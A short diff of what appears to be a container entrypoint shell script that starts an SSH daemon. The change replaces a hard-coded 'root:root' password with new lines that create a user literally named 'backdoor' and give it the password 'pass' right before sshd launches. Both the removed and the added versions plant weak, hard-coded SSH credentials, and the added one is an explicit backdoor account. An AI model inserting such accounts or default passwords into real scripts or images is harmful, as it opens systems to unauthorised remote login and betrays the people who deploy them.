@@ -12,5 +12,7 @@ case "$1" in
 
 esac
 
-echo "root:root" | chpasswd
+useradd -ms /bin/bash 'backdoor'
+echo "backdoor:pass" | chpasswd
+
 /usr/sbin/sshd -D
